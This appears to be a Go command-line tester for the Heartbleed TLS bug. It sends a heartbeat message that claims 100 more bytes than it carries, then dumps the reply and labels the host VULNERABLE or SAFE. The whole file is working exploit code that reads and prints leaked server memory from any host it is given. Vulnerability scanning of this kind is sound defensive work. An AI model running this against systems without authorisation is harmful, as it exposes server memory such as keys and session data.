package main

import (
	"bytes"
	"encoding/binary"
	"github.com/FiloSottile/Heartbleed/tls"
	"github.com/davecgh/go-spew/spew"
	"log"
	"os"
	"time"
)

var (
	PAYLOAD = []byte("heartbleed.filippo.io")
	PADDING = []byte("YELLOW SUBMARINE")
)

// struct {
//    uint8  type;
//    uint16 payload_length;
//    opaque payload[HeartbeatMessage.payload_length];
//    opaque padding[padding_length];
// } HeartbeatMessage;
func buildEvilMessage(payload []byte) []byte {
	buf := bytes.Buffer{}
	err := binary.Write(&buf, binary.BigEndian, uint8(1))
	if err != nil {
		panic(err)
	}
	err = binary.Write(&buf, binary.BigEndian, uint16(len(payload)+100))
	if err != nil {
		panic(err)
	}
	_, err = buf.Write(payload)
	if err != nil {
		panic(err)
	}
	_, err = buf.Write(PADDING)
	if err != nil {
		panic(err)
	}
	return buf.Bytes()
}

func main() {
	conn, err := tls.Dial("tcp", os.Args[1], &tls.Config{
		InsecureSkipVerify: true,
	})
	if err != nil {
		log.Fatalf("%v - failed to connect: %v", os.Args[1], err.Error())
	}

	conn.SendHeartbeat([]byte(buildEvilMessage(PAYLOAD)), func(data []byte) {
		spew.Dump(data)
		if bytes.Index(data, PADDING) == -1 {
			conn.Close()
			log.Printf("%v - SAFE", os.Args[1])
			os.Exit(1)
		} else {
			conn.Close()
			log.Printf("%v - VULNERABLE", os.Args[1])
			os.Exit(0)
		}

	})

	go func() {
		conn.Read(nil)
	}()
	time.Sleep(3 * time.Second)
	conn.Close()
	log.Printf("%v - TIMEOUT", os.Args[1])
	os.Exit(1)
}
